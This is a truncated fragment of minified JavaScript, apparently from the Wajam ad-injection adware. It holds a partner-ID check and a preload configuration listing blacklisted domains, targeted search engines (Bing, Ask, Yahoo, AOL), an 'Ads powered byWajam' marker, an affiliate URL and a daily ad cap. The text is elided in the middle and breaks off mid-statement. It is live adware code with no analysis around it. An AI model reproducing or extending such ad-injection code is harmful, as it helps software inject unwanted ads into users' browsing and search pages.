(function(){if(window.visadd){var encoded_partner='14567725553';if(encoded_partner!=visadd.preload.encoded_partner){try{var sub_id='';if(encoded_partner=="14567725798"||encoded_partner=="14567725764"||encoded_partner=="14567725690"){if(typeof(vadims_sub_id)!='undefined'){sub_id=vadims_sub_id;}}
...
visadd.preload={domain_blacklist:';google;facebook;mail.aol.com;mail.yahoo.com;webmail;ads.yahoo.com;imprim-encre.com;cartouche.com;wikipedia.com;1800petmeds.com;',domain_restricted:'',domain_search:';bing.com;ask.com;search.yahoo.com;search.aol.com;google;',page_blacklist:'',encoded_partner:'14567725553',sub_id:'',unit_marker:'Ads powered byWajam',unit_marker_url:'http://www.jeanlesagetechnology.com/settings/ads?affiliate_id=1647',issued_request:false,search_term_to_use:null,over_cap:false,cap_x24:10,allow_https:false,language:function(){try{var lang_dict={"br":"pt","it":"it","es":"es","fr":"fr","de":"de","mx":"es","ar":"es","co":"es","cl":"es"};var curr_host=document.location.host;curr_host_split=curr_host.split(".")
